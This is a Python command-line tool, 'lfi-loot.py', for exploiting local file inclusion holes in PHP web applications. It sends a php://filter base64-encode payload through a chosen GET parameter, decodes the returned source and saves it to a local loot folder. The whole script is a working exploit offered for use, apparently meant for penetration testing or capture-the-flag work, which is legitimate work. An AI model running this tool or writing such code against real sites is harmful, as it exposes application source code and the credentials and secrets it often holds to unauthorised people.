#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
   lfi-loot.py
   Script to loot php files from application that has a LFI vuln.
"""
__author__ = 'kall.micke@gmail.com'

import getopt
import sys
import requests
import base64
import os
import re

from html.parser import HTMLParser

def __usage():
    print ("""
lfi-loot [ kall.micke@gmail.com ]
This tool loot files from a php application that has an LFI vuln.

usage: lfi-loot <options>
       -f: filename
       -g: get parameter
       -u: url
example: lfi-loot.py -f index.php -g file -u http://localhost:8080
""")
    sys.exit()

class MLStripper(HTMLParser):
    def __init__(self):
        self.reset()
        self.strict = False
        self.convert_charrefs= True
        self.fed = []
    def handle_data(self, d):
        self.fed.append(d)
    def get_data(self):
        return ''.join(self.fed)

def strip_tags(html):
    s = MLStripper()
    s.feed(html)
    return s.get_data()

def __puts(tp, msg):
    """Output messages in fancy colors."""
    if tp == "info":
        print("%s%s%s" % ('\033[93m', "➜ ", msg))
    elif tp == "warning":
        print("%s%s%s" % ('\033[93m', "➜ ", msg))
    elif tp == "error":
        print("%s%s%s" % ('\033[91m', "✖ ", msg))
    elif tp == "success":
        print("%s%s%s" % ('\033[92m', "✔ ", msg))

def __loot(file, url, param='file'):
    _payload = '?{0}=php://filter/convert.base64-encode/resource={1}'.format(param, file)
    r = requests.get('{0}/{1}'.format(url,_payload))
    results = strip_tags(r.text)
    results = [r.strip() for r in results.split('\n')]
    bs64 = max(results, key=len)

    if bool(re.match(r'^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4})$', bs64)):
        if os.path.isdir('.loot') is False:
            os.makedirs('.loot')

        _file_decoded = base64.b64decode(str(bs64)).decode('utf-8')

        with open('.loot/{0}'.format(file),'w') as filename:
            filename.write(_file_decoded)
            __puts('success', "Looted ./.loot/{0} from {1}".format(file, url))
    else:
        __puts('error', "Failed to loot {0} from {1}".format(file, url))

if __name__ == '__main__':

    if len(sys.argv) < 2:
        __usage()
    try :
        opts, args = getopt.getopt(sys.argv[1:],"f:g:u:")

    except getopt.GetoptError:
        __usage()
        sys.exit()

    for opt,arg in opts:
        if opt == '-f':
            file=arg

        if opt == '-g':
           param=arg

        if opt == '-u':
           url=arg
    try:
        __loot(file, url, param)
    except:
        __usage()
